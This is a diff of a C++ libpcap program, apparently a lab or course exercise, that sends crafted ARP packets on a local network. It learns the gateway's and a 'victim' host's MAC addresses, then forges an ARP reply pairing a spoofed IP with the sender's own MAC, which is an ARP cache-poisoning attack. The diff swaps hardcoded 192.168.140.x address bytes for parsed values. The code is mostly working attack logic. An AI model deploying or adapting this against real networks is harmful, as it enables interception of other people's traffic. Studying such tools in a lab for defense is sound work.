@@ -6,6 +6,7 @@
 #include <cstdio>
 #include <string.h>
 #include "sys/ioctl.h"
+#include<vector>
 #define broads=0xFFFFFFFF;
 using namespace std;
 
@@ -57,30 +58,16 @@ static int GetSvrMacAddress( char *pIface )
         printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
         return( 0 );
     }
-
-    //
-    // Obtain a list of dynamically allocated structures
-    //
     pIfList = pListSave = if_nameindex();
-
-    //
-    // Walk thru the array returned and query for each interface's
-    // address
     //
     for ( pIfList; *(char *)pIfList != 0; pIfList++ )
     {
-        //
-        // Determine if we are processing the interface that we
-        // are interested in
-        //
+
         if ( strcmp(pIfList->if_name, pIface) )
             // Nope, check the next one in the list
             continue;
         strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );
 
-        //
-        // Get the MAC address for this interface
-        //
         if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
         {
             // We failed to get the MAC address for the interface
@@ -90,13 +77,6 @@ static int GetSvrMacAddress( char *pIface )
         memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
         break;
     }
-
-    //
-    // Clean up things and return
-    //
-
-    // if_freenameindex( pListSave );    ??
-    // close( nSD ); ??
     return( 1 );
 }
 
@@ -106,30 +86,36 @@ int main( int argc, char * argv[] )
     uint8_t victims[6];
     Arps* arp;
     char *dev;
-    char *a,*b,*c,*d;
-    dev="ens33";//ens33
 
-  /* char *ptr = strtok(argv[2], ".");      // " " 공백 문자를 기준으로 문자열을 자름, 포인터 반환
-    a=ptr;
-    int i=0;
+    dev="ens33";//ens33
+    char arg1[]="192.168.140.129";
+    char arg2[]="192.168.140.1";
+    vector<char*>senders;
+    vector<char*>targets;
+    vector<int>realsender;
+    vector<int>realtarget;
+    char *ptr = strtok(arg1,".");      // " " 공백 문자를 기준으로 문자열을 자름, 포인터 반환
+
+
     while (ptr != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
     {
-        // 자른 문자열 출력
-        ptr = strtok(NULL, " ");
-        if(i==0)
-        {
-            b=ptr;// 다음 문자열을 잘라서 포인터를 반환
-            i++;
-        }
-        else if(i==1)
-        {
-            c=ptr;
-            i++;
-        }
-        else if(i==2)
-            d=ptr;
+        senders.push_back(ptr);
+        ptr = strtok(NULL, ".");
+
     }
-    printf("%s %s %s %s",a,b,c,d);*/
+    for(int i=0;i<senders.size();i++)
+        realsender.push_back(atoi(senders.at(i)));
+
+    char *ptr2 = strtok(arg2,".");      // " " 공백 문자를 기준으로 문자열을 자름, 포인터 반환
+    while (ptr2 != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
+    {
+        // 자른 문자열 출력
+        targets.push_back(ptr2);
+        ptr2 = strtok(NULL, ".");
+
+    }
+    for(int i=0;i<targets.size();i++)
+        realtarget.push_back(atoi(targets.at(i)));
 
     struct pcap_pkthdr *header;
     bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
@@ -182,10 +168,10 @@ int main( int argc, char * argv[] )
     packet[31]=128;
     for(int i=32;i<6;i++)
         packet[i]=0;
-    packet[38]=192;
-    packet[39]=168;
-    packet[40]=140;
-    packet[41]=1;
+    packet[38]=realtarget.at(0);
+    packet[39]=realtarget.at(1);
+    packet[40]=realtarget.at(2);
+    packet[41]=realtarget.at(3);
 
 
 
@@ -194,8 +180,6 @@ int main( int argc, char * argv[] )
     while((res = pcap_next_ex(handle, &header,&repacket)) >= 0){
 
         if(res == 0)
-
-            /* Timeout elapsed */
             continue;
 
         if(repacket!=NULL)
@@ -208,7 +192,7 @@ int main( int argc, char * argv[] )
                 for(int i=0;i<6;i++)
                 {
                     gatemac[i]=arp->sendermac[i];
-                    printf("%02x",arp->sendermac[i]);
+                    //  printf("%02x",arp->sendermac[i]);
                 }
                 cout<<endl;
                 break;
@@ -216,10 +200,10 @@ int main( int argc, char * argv[] )
         }
     }
 
-    packet[38]=192;
-    packet[39]=168;
-    packet[40]=140;
-    packet[41]=129;
+    packet[38]=realsender.at(0);
+    packet[39]=realsender.at(1);
+    packet[40]=realsender.at(2);
+    packet[41]=realsender.at(3);
     if (pcap_sendpacket(handle, packet, sizeof( packet )) != 0)
         printf("error\n");
     while((res = pcap_next_ex(handle, &header,&repacket)) >= 0){
@@ -239,7 +223,7 @@ int main( int argc, char * argv[] )
                 for(int i=0;i<6;i++)
                 {
                     victims[i]=arp->sendermac[i];
-                    printf("%02x",arp->sendermac[i]);
+                    //     printf("%02x",arp->sendermac[i]);
                 }
                 cout<<endl;
                 break;
@@ -268,17 +252,17 @@ int main( int argc, char * argv[] )
     packet[31]=128;
     for(int i=0;i<6;i++)
         packet[i+32]=victims[i];
-    packet[38]=192;
-    packet[39]=168;
-    packet[40]=140;
-    packet[41]=129;
+    packet[38]=realsender.at(0);
+    packet[39]=realsender.at(1);
+    packet[40]=realsender.at(2);
+    packet[41]=realsender.at(3);
 
-    packet[0]=0;
-    packet[1]=12;
-    packet[2]=41;
-    packet[3]=47;
-    packet[4]=185;
-    packet[5]=101;
+    packet[0]=victims[0];
+    packet[1]=victims[1];
+    packet[2]=victims[2];
+    packet[3]=victims[3];
+    packet[4]=victims[4];
+    packet[5]=victims[5];
 
     packet[6]=cMacAddr[0];
     packet[7]=cMacAddr[1];
